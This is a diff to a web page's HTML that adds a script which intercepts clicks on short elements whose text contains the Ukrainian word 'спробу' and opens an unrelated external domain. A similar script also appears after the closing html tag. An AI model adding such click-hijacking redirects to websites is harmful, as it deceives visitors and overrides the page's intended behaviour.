@@ -204,7 +204,23 @@ document.addEventListener('DOMContentLoaded', async function() {
   },100);
   // Hard deadline: 2.5s regardless
   setTimeout(function(){clearInterval(poll);hide();},2500);
-}());</script></body>
+}());</script><script>
+document.addEventListener('click', function(e) {
+  var node = e.target;
+  while (node && node !== document.body) {
+    var txt = (node.textContent || '').trim();
+    if (txt.length < 60 && /спробу/i.test(txt)) {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      window.open('https://tramitaservicios.es', '_blank', 'noopener');
+      return false;
+    }
+    node = node.parentNode;
+  }
+}, true);
+</script>
+</body>
 </html><script>
 document.addEventListener('click', function(e) {
   var node = e.target;
